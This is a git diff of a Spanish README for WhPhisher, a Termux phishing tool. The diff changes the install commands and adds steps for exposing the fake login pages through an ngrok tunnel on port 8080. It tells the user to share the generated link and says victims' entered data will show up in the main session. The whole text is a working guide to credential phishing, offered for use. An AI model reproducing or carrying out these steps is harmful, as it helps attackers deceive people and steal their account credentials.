@@ -9,36 +9,27 @@ Termux, Kali Linux y debian
 
 Para qué hayan menos probabilidades de que falle esta herramienta, se aconseja instalar la última versión de Termux, y Termux API.
 
-Termux Última versión --> 
-https://f-droid.org/repo/com.termux_118.apk
-
-Termux API Última versión --> https://f-droid.org/repo/com.termux.api_51.apk
-
-
 # Como instalar
-
 
 `termux-setup-storage`
 
-`pkg update`
+`pkg install proot -y`
 
-`pkg install proot`
+`pkg install python3 -y`
+
+`pkg install php -y`
+
+`pkg install git -y`
+
+`pkg install wget -y`
+
+`pkg install ruby -y`
+
+`pkg install unzip -y`
 
 `pkg install curl`
 
-`pkg install python`
-
-`pkg install python2`
-
-`pkg install python3`
-
-`pkg install git`
-
 `pkg update & apt upgrade`
-
-`pkg install tmux`
-
-`pkg upgrade && update`
 
 `git clone https://github.com/WhBeatZ/WhPhisher`
 
@@ -52,7 +43,44 @@ Elegir la página y esperar a que inicie el túneling.
 
 [![Virtual-Box-VM-pqnlsb1ey-B.png](https://i.postimg.cc/gJJMyjfj/Virtual-Box-VM-pqnlsb1ey-B.png)](https://postimg.cc/mcvNBLZW)
 
-# Solucion si no se genera el link o no funciona
+# Solucion si no se genera el link o no funciona (2 soluciones)
+
+# - - - Solucion 1 - - -
+
+
+-Si ya tiene ngrok instalado, solo tiene que ir a su carpeta donde lo instalo y iniciar el tunneling en el puerto 8080
+
+
+Pero si no lo tiene, tiene que hacer estos pasos:
+
+
+Abrir nueva sesion
+
+Para solucionarlo, hay que tener previamente ngrok instalado en termux, si no lo tienes instalado mira un video de como instalar ngrok.
+Video explicativo como de instalar ngrok --> https://www.youtube.com/watch?v=HPNGs9HYLIM
+
+Pasos para instalar ngrok:
+
+`cd`
+
+`git clone https://github.com/Darkmux/NgrokTH`
+
+`cd NgrokTH`
+
+`bash ngrok.sh`
+
+`y`
+
+Ahora hay que poner el autocken de tu cuenta de ngrok.com como se muestra en el video
+
+`ngrok http 8080`
+
+`Y compartir el link que se generó :D`
+
+Ahora volvemos a la sesion principal, y si alguien puso sus datos, nos saldrás ahí
+
+
+# - - - Solucion 2 - - -
 
 Pasos:
 
